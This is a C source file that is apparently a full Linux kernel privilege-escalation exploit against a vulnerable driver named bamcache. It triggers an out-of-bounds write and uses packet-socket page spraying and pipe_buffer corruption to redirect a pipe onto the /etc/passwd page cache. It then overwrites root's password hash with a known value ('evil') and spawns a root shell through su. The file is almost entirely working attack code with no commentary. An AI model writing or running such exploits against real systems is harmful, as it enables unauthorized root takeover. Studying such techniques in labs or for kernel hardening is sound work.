#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <sys/ipc.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>


#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");

#define ALLOC 0xcafe01
#define DELETE 0xcafe02
#define EDIT 0xcafe03

typedef struct
{
    int64_t idx;
    uint64_t size;
    char *buf;    
}user_req_t;

int dev_fd;

int open_device()
{
    int fd = open("/dev/bamcache", O_RDWR);
    if(fd==-1){
        perror("[-] open(/dev/bamcache)");
        return EXIT_FAILURE;
    }

    puts("[+] Device opened");

    return fd;
}

int bam_add(uint64_t idx)
{
    user_req_t req = {
        .idx = idx,
    };

    int ret = ioctl(dev_fd, ALLOC, &req);
    if(ret==-1){
        perror("[-] bamcache: add failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int bam_edit(uint64_t idx, uint64_t size, char *buff)
{
    user_req_t req = {
        .idx = idx,
        .size = size,
        .buf = buff
    };

    int ret = ioctl(dev_fd, EDIT, &req);
    if(ret==-1){
        perror("[-] bamcache: edit failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int bam_del(uint64_t idx)
{
    user_req_t req = {
        .idx = idx,
    };

    int ret = ioctl(dev_fd, DELETE, &req);
    if(ret==-1){
        perror("[-] bamcache: delete failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

#define PIPE_NUM 200
#define FILE_NUM 0x100

int pipe_fd[PIPE_NUM][2];
int file_fd[FILE_NUM];
size_t find_pipe[PIPE_NUM][2];
int same_pipe[2];

void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

size_t find_page_addr(size_t *data)
{
    for(int idx=0;idx<0xbf0/8;idx++)
    {
        if(data[idx]>0xffff000000000000&&data[idx+1]==0x100000003&&data[idx+2]>0xffffffff81000000&&data[idx+3]==0&&data[idx]!=0xffffffffffffffff)
        {
            return idx;
        }
    }
    return -1;
}

size_t find_normal_pipe(size_t *data,int pwd_page_idx)
{
    for(int idx=0;idx<0xbf0/8;idx++)
    {
        if(data[idx]>0xffff000000000000&&data[idx+1]!=0x100000000&&data[idx+2]>0xffffffff81000000&&data[idx+3]==0x10&&data[idx+4]==0&&data[idx+5]==0&&data[idx+6]==0)
        {
            if(idx-pwd_page_idx>24||pwd_page_idx-idx>24)
                return idx;
        }
    }
    return -1;
}

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;
  
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
 
    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);
  
    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
  
    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
} 

#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    usleep(10000);

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    
    /* child process for pages spray */
    if (!fork()) {
        spray_cmd_handler();
    }
}

/**
 * IV - config for page-level heap spray and heap fengshui
 */
#define PIPE_SPRAY_NUM PIPE_NUM

#define PGV_1PAGE_SPRAY_NUM 0x20

#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
#define PGV_4PAGES_SPRAY_NUM 0x40

#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
#define PGV_8PAGES_SPRAY_NUM 0x40

int pgv_1page_start_idx = 0;
int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;

/* spray pages in different size for various usages */
void prepare_pgv_pages(void)
{
    /**
     * We want a more clear and continuous memory there, which require us to 
     * make the noise less in allocating order-3 pages.
     * So we pre-allocate the pages for those noisy objects there.
     */
    puts("[*] spray pgv order-0 pages...");
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        if (alloc_page(i, 0x1000, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("[*] spray pgv order-2 pages...");
    for (int i = 0; i < PGV_4PAGES_SPRAY_NUM; i++) {
        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    /* spray 8 pages for page-level heap fengshui */
    puts("[*] spray pgv order-3 pages...");
    for (int i = 0; i < PGV_8PAGES_SPRAY_NUM; i++) {
        /* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/
        if (i % 19 == 0) {
            free_page(pgv_4pages_start_idx++);
        }

        /* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */
        if (i % 21 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        /* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/
        if (i % 512 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("");
}


int main(int argc, char **argv, char **envp)
{
    cpu_set_t cpu_set;
    char bam_buff[0x1000];

    dev_fd = open_device();

    puts("\033[32m\033[1m[+] bamcache no leak page-uaf.\033[0m");

    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    prepare_pgv_system();
    prepare_pgv_pages();

    int target_file_fd;
    target_file_fd = open("/etc/passwd", O_RDONLY);
    char *addr = mmap(NULL,0x1000, PROT_READ, MAP_SHARED, target_file_fd, 0);
    if(addr<=0)
    {
        errExit("mmap error.");
    }
    if (target_file_fd < 0){
		errExit("Failed to open the pwd file");
    }
    long page_size = sysconf(_SC_PAGE_SIZE);

    size_t pipe_magic;
    for(int i=0;i<PIPE_NUM;i++)
    {
        if(pipe(pipe_fd[i])<0)
        {
            printf("[x] failed to alloc %d pipe!", i);
            errExit("PIPE_ERROR.");
        }
    }

    puts("[*] exetend pipe_buffer...");
    for(int i=0;i<PIPE_NUM;i++)
    {
        if (i % 8 == 0) {
            free_page(pgv_8pages_start_idx++);
        }
        
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] failed to extend %d pipe!\n",i);
            return -1;
        }
        if (i % 8 == 0) {
            bam_add(i);
        }
    }

    puts("[*] allocating pipe pages...");
    for (int i = 0; i < PIPE_NUM; i++) {
        size_t magic_num = 0xdead0000+i;
        write(pipe_fd[i][1], &magic_num, 8);
        write(pipe_fd[i][1], "bambamx7", 8);
        // write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], "bambamx7", 8);
        write(pipe_fd[i][1], "bambamx7", 8);  /* prevent pipe_release() */
    }
    // getchar();

    puts("[*] Create 4 holes in pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i += (PIPE_NUM/4))
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
    
    puts("[*] Trigger oob");

    for(int i = 1; i < 30; i++){
        bam_edit(i, 0x1000, bam_buff);
    }

    for (int i = 0; i < PIPE_NUM; i++)
    {
        if(i%(PIPE_NUM/4)!=0)//can't equal to the hole
        {
            read(pipe_fd[i][0],find_pipe[i],0x10);
        }
        
    }

    size_t victim_id = 0;
    size_t prev_id = 0;
    size_t magic = 0;
    size_t offset_in_file;
    int retval;
    char *tmp_content = malloc(0x1000);
    size_t buf[0x1000];
    size_t pipe_data[0x200];
    int SND_PIPE_BUF_SZ = 96*2;
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/0x28);

    int is_found = 0;
    // puts("[*]finding...");
    for (int i = 0; i < PIPE_NUM&&!is_found; i++)
    {
        if(i%(PIPE_NUM/4)!=0)//can't equal to the hole
        {
            if(find_pipe[i][0]!=0xdead0000+i&&!strncmp(&find_pipe[i][1],"bambamx7",8))
            {
                same_pipe[0]=find_pipe[i][0]-0xdead0000;
                same_pipe[1]=i;//previous
                // if(same_pipe[0]>PIPE_NUM||same_pipe[0]-same_pipe[1]==1||same_pipe[1]-same_pipe[0]==1)
                if(same_pipe[0]>PIPE_NUM)
                {
                    RED puts("[*]pipe idx out of range."); CLOSE
                    return -1;
                }
                BLUE printf("found pipe coincide at idx:%d and %d\n",same_pipe[0],same_pipe[1]); CLOSE
                is_found=1;
            }   
        }
        
    }
    if(!is_found)
    {
        perror("[*] Not found two pipe.");
        for(int i = 1; i < 10; i++){
            bam_del(i);
        }
        close(dev_fd);
        return -1;
    }

    memset(buf, '\0', sizeof(buf));

    /*write something to alarge the pipe_read size after*/
    // write(pipe_fd[same_pipe[1]][1], buf,0x500);
    write(pipe_fd[same_pipe[1]][1], buf, SND_PIPE_BUF_SZ*0x10 - 24 - 3*sizeof(int));


    puts("[*]uaf one of the pipe_buffer");
    // getchar();
    close(pipe_fd[same_pipe[0]][0]);
    close(pipe_fd[same_pipe[0]][1]);

    // puts("[*]press enter to put the pwd file page cache into the uaf page");
    puts("[*] fcntl() to set the pipe_buffer on victim page...");
    // getchar();

    
    for (int i = 0; i < PIPE_NUM; i++) {
        if (i == same_pipe[1] || i == same_pipe[0] || i%(PIPE_NUM/4)==0) {
            continue;
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) {
            printf("[x] failed to resize %d pipe!\n", i);
            return -1;
        }
    }

    for (int i = 0; i < PIPE_NUM; i++) {
        if (i == same_pipe[1] || i == same_pipe[0] || i%(PIPE_NUM/4)==0) {
            continue;
        }

        if (write(pipe_fd[i][1], "7", 1) < 0) {
            printf("[x] failed to write one byte in %d pipe!\n", i);
            return -1;
        }
    }

    //what we want to read pwd->page
    for (int i = 1; i < PIPE_NUM; i+=2) {
        if (i == same_pipe[1] || i == same_pipe[0] || i%(PIPE_NUM/4)==0) {
            continue;
        }
        offset_in_file = 3;
        retval = splice(target_file_fd, &offset_in_file, pipe_fd[i][1], NULL, 1, 0);
	    if (retval < 0)
        {
            printf("splice failed:%d!\n",i);
            return -1;
        }
		    
	    else if (retval == 0)
        {
            printf("short splice:%d!\n",i);
            return -1;
        }    
    }
    puts("\033[32m\033[1m[+] File splice done.\033[0m");


    puts("[*]Try to read from pipe");

    int read_pipe_size = 0xc00;//SND_PIPE_BUF_SZ*4
    retval = read(pipe_fd[same_pipe[1]][0],pipe_data,read_pipe_size);
    if (retval < 0)
            {
                printf("read failed:!");
                return -1;
            }
            // else if (retval < read_pipe_size)
                // {
                // printf("short read!");
                // return -1;
                // }

    puts("[*]find the pwd->page_addr...");
    int pwd_page_idx = find_page_addr(&pipe_data);
    size_t page_addr = pipe_data[pwd_page_idx];
    if(page_addr<=0)
    {
        printf("[*]pwd->page_addr not found!\n");
        return -1;
    }

    BLUE printf("[*] pwd->page_addr:0x%llx\n",page_addr); CLOSE

    puts("[*]find the normal_pipe_page idx...");
    size_t normal_pipe_page_idx = find_normal_pipe(&pipe_data,pwd_page_idx);
    if(normal_pipe_page_idx<0)
    {
        printf("[*]normal_pipe_page not found!\n");
        return -1;
    }
    BLUE printf("[*] normal_pipe_page_idx:0x%llx\n",normal_pipe_page_idx); CLOSE

    
    //pipe_data[(0xb8)/8] = pipe_data[3];
    //pipe_data[(0xc0)/8] = 0x100000000;
    pipe_data[normal_pipe_page_idx] = page_addr;
    pipe_data[normal_pipe_page_idx+1] = 0x400000000;
    char *tmp = malloc(0x1000);

    memset(tmp,"A",0x10);
    memcpy(tmp+0x10,pipe_data,retval);

    puts("[*]edit the pipe->page to the pwd->page");
    write(pipe_fd[same_pipe[1]][1],tmp,retval);

    char *data = ":$1$evil$B1cg.QF41pkr9LUa9L0vm1:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt evil evil
    printf("Setting root password to \"evil\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd page cache");
    //what we want to edit pipe->page
    for (int i = 1;i < PIPE_NUM; i++) {
        if (i == same_pipe[1] || i == same_pipe[0] || i%(PIPE_NUM/4)==0 || i%0x8==0) {
            continue;
        }
        int retval = write(pipe_fd[i][1], data,data_size);
            if (retval < 0)
            {
                printf("Write failed:%d!",i);
                return -1;
            }
            else if (retval < data_size)
                {
                    printf("short write:%d!",i);
                return -1;
                }
        }
    puts("[*]Now the pwd is:"); CLOSE
    system("cat /etc/passwd");
    char *cmd[] = {"/bin/sh", "-c", "(echo evil; cat) | su - -c \""
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};

    execv("/bin/sh", cmd);
}